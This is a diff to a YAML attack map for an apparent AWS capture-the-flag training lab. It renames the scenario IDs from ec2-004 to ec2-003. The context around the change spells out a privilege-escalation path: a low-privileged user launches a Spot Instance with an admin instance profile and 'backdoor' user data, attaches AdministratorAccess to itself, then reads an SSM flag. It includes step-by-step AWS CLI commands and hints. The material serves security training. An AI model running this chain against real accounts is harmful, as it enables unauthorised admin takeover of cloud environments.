@@ -4,7 +4,7 @@ attackMap:
       label: "Starting User"
       type: principal
       subType: iam-user
-      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2-004-to-admin-starting-user"
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-admin-starting-user"
       access:
         type: assumed-breach-credentials
       description: >
@@ -33,7 +33,7 @@ attackMap:
       type: principal
       subType: iam-role
       isAdmin: true
-      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2-004-to-admin-target-role"
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-admin-target-role"
       description: >
         This IAM role has administrative permissions and trusts ec2.amazonaws.com, allowing
         it to be attached to EC2 instances via an instance profile. When the Spot Instance
@@ -47,7 +47,7 @@ attackMap:
       type: resource
       subType: ssm-parameter
       isTarget: true
-      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ec2-004-to-admin"
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ec2-003-to-admin"
       description: >
         The CTF flag for this scenario, stored as an SSM parameter in the victim account.
         Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
@@ -65,10 +65,10 @@ attackMap:
       hints:
         - "Use ec2:RequestSpotInstances with a launch specification that includes IamInstanceProfile (the instance profile wrapping the admin role) and UserData (a base64-encoded script that calls iam:AttachUserPolicy). ec2:RequestSpotInstances works almost identically to ec2:RunInstances for this purpose."
         - "Poll ec2:DescribeSpotInstanceRequests until the request is fulfilled and you have an instance ID. The user-data script typically takes 2-3 minutes to execute after the instance reaches 'running'. After it completes, your original starting user credentials will have full admin access — no role assumption needed."
-        - "Browse to https://pathfinding.cloud/paths/ec2-004 for technique details."
+        - "Browse to https://pathfinding.cloud/paths/ec2-003 for technique details."
       commands:
         - description: "List instance profiles to find the admin profile"
-          command: "aws iam list-instance-profiles --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-004`)].{Name:InstanceProfileName,Arn:Arn}'"
+          command: "aws iam list-instance-profiles --query 'InstanceProfiles[?contains(InstanceProfileName, `ec2-003`)].{Name:InstanceProfileName,Arn:Arn}'"
         - description: "Find the latest Amazon Linux 2023 AMI in your region"
           command: "aws ec2 describe-images --owners amazon --filters 'Name=name,Values=al2023-ami-2023.*-x86_64' 'Name=state,Values=available' --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
         - description: "Get a subnet ID from the default VPC"
@@ -82,7 +82,7 @@ attackMap:
               --launch-specification '{
                 "ImageId": "<ami-id>",
                 "InstanceType": "t3.micro",
-                "IamInstanceProfile": {"Name": "pl-prod-ec2-004-to-admin-instance-profile"},
+                "IamInstanceProfile": {"Name": "pl-prod-ec2-003-to-admin-instance-profile"},
                 "UserData": "<base64-encoded-backdoor-script>",
                 "NetworkInterfaces": [{"DeviceIndex": 0, "SubnetId": "<subnet-id>", "AssociatePublicIpAddress": true}]
               }'
@@ -99,7 +99,7 @@ attackMap:
         - description: "Poll for the spot request to be fulfilled"
           command: "aws ec2 describe-spot-instance-requests --spot-instance-request-ids <request-id> --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' --output text"
         - description: "Verify the AdministratorAccess policy was attached to the starting user"
-          command: "aws iam list-attached-user-policies --user-name pl-prod-ec2-004-to-admin-starting-user"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-ec2-003-to-admin-starting-user"
         - description: "Verify administrator access with the starting user credentials"
           command: "aws iam list-users --max-items 3 --output table"
 
@@ -115,4 +115,4 @@ attackMap:
         - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
       commands:
         - description: "Retrieve the CTF flag from SSM Parameter Store"
-          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ec2-004-to-admin --query 'Parameter.Value' --output text"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ec2-003-to-admin --query 'Parameter.Value' --output text"
